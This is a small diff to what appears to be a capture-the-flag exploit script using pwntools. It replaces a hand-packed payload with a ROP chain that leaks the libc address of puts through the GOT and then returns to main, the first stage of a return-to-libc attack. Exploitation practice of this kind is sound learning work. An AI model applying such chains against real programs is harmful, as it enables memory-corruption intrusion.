@@ -51,11 +51,14 @@ def main():
     power = int(power_up(p, b"A"))
     log.info(f"{power = }")
     
+    rop = ROP(elf)
+    rop.call(elf.plt.puts, [elf.got.puts])
+    rop.call(elf.sym.main)
+
+    print(rop.dump())
     payload = b"Y"*3
     payload += b"Z"*4
-    payload += p32(elf.plt.puts)
-    payload += p32(elf.sym.main)
-    payload += p32(elf.got.puts)
+    payload += rop.chain() 
 
     power_up(p, payload)
     beat(p)
